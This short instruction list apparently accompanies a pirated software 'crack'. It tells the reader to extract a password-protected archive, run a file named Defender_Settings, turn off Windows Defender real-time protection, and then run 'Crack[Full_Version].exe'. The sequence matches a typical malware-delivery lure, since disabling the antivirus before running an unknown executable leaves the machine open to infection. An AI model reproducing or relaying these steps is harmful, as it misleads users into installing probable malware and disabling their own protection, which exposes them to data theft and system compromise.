MANUAL :
1. Unzip all files from archive [Full_Version].rar (Password: pass)
2. Go to folder [Full_Version]
3. Run file: Defender_Settings
4. Disable Real-time protection
5. Run file: Crack[Full_Version].exe